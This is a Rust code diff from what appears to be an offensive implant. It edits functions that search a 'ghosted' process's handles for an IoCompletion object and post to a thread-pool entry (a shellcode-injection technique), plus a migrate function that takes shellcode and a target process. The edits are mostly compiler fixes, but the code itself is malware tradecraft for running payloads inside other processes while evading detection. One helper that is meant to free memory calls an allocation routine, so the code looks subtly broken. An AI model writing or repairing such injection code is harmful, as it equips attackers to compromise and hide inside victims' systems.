@@ -5,7 +5,7 @@ use crate::core::types::*;
 use crate::core::nt;
 use crate::debug;
 
-unsafe fn try_post_io_completion(target_process: HANDLE, tp_direct_addr: *mut c_void) -> bool {
+unsafe fn try_post_io_completion(target_process: HANDLE, tp_direct_addr: *mut c_void) -> bool { unsafe {
     // Query the ghosted process handles via ProcessHandleInformation
     // This reqturn ONLY the process handles, no system-wide enumeration
     // Ghost process has very few handles, so a small buffer suffices
@@ -52,10 +52,10 @@ unsafe fn try_post_io_completion(target_process: HANDLE, tp_direct_addr: *mut c_
 
     let header = buffer as *const ProcessHandleSnapshotInformation;
     let handles_count = (*header).number_of_handles;
-    let handles_array = (buffer as usize + core::mem::size_of::<ProcessHandleSnapshotInformation>()) as *const ProcessHandleSnapshotInformation;
+    let handles_array = (buffer as usize + core::mem::size_of::<ProcessHandleSnapshotInformation>()) as *const ProcessHandleTableEntryInfo;
 
     let current_process: HANDLE = -1isize as HANDLE;
-    let tried_count: usize = 0;
+    let mut tried_count: usize = 0;
     let mut posted = false;
 
     debug!("[POOL] Process has {} handles, scannong for IoCompletion", handles_count);
@@ -109,13 +109,13 @@ unsafe fn try_post_io_completion(target_process: HANDLE, tp_direct_addr: *mut c_
 
     free_virtual_memory(buffer);
     posted
-}
+}}
 
 
 /**
  * Helper to free virtual memory allocated in our own process
  * */
-unsafe fn free_virtual_memory(mut buffer: *mut c_void) {
+unsafe fn free_virtual_memory(mut buffer: *mut c_void) { unsafe {
     let mut free_size: usize = 0;
     nt::nt_allocate_virtual_memory(
         -1isize as HANDLE,
@@ -125,7 +125,7 @@ unsafe fn free_virtual_memory(mut buffer: *mut c_void) {
         0x00008000, // MEM_RELEASE
         0,
     );
-}
+}}
 
 pub unsafe fn migrate(shellcode: &[u8], process_handle: HANDLE, target_pid: usize) -> bool { unsafe {
     if shellcode.is_empty() || process_handle.is_null() || target_pid == 0 {
